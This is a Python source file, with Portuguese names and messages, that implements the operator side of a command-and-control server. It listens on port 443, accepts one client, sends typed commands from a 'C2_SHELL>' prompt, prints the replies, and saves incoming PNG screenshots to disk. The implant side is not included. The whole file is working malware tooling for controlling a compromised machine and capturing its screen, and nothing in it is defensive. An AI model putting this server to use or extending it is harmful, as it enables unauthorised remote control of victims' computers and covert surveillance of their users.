import socket
import sys
import struct
import threading

LISTEN_IP = "0.0.0.0"
PORT = 443

def enviar_mensagem(sock, payload):
    if isinstance(payload, str):
        payload = payload.encode('utf-8')
    pacote = struct.pack(">I", len(payload)) + payload
    sock.sendall(pacote)

def receber_bytes_exatos(sock, tamanho_esperado):
    dados_acumulados = b""
    while len(dados_acumulados) < tamanho_esperado:
        bytes_restantes = tamanho_esperado - len(dados_acumulados)
        pacote = sock.recv(bytes_restantes)
        if not pacote:
            raise ConnectionResetError()
        dados_acumulados += pacote
    return dados_acumulados

def receber_mensagem(sock):
    try:
        bytes_do_tamanho = receber_bytes_exatos(sock, 4)
        tamanho_do_payload = struct.unpack(">I", bytes_do_tamanho)[0]
        return receber_bytes_exatos(sock, tamanho_do_payload)
    except (ConnectionResetError, struct.error, socket.error):
        return None

def receive_handler(client_socket):
    while True:
        try:
            payload = receber_mensagem(client_socket)
            if payload is None:
                print("\n[-] Conexão encerrada pelo cliente.\nC2_SHELL> ", end="", flush=True)
                break
            
            if payload.startswith(b'\x89PNG\r\n\x1a\n'):
                nome_arquivo = f"screenshot_{threading.get_ident()}.png"
                with open(nome_arquivo, "wb") as f:
                    f.write(payload)
                print(f"\n[+] Imagem salva: {nome_arquivo} ({len(payload)} bytes).\nC2_SHELL> ", end="", flush=True)
            else:
                texto_recebido = payload.decode("utf-8", errors="replace")
                print(f"\n{texto_recebido}\nC2_SHELL> ", end="", flush=True)
                
        except socket.timeout:
            continue
        except OSError:
            print("\n[-] Erro de E/S no socket.")
            break

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Listening on {LISTEN_IP}:{PORT}...")
    except OSError as e_bind:
        print(f"[!] Erro no bind na porta {PORT}: {e_bind}")
        sys.exit(1)
        
    try:
        client_socket, client_address = server.accept()
        print(f"[+] Conexão aceita de {client_address[0]}:{client_address[1]}")
        
        client_socket.settimeout(1.0)
        
        recv_thread = threading.Thread(target=receive_handler, args=(client_socket,), daemon=True)
        recv_thread.start()
        
        while True:
            try:
                command = input("C2_SHELL> ").strip()
                if not command:
                    continue
                    
                enviar_mensagem(client_socket, command)
                
                if command == "/exit":
                    print("[*] Closing connection.")
                    break
            except KeyboardInterrupt:
                break
            except OSError as e_envio:
                print(f"[-] Erro de envio: {e_envio}")
                break
                    
    finally:
        server.close()

if __name__ == "__main__":
    start_server()
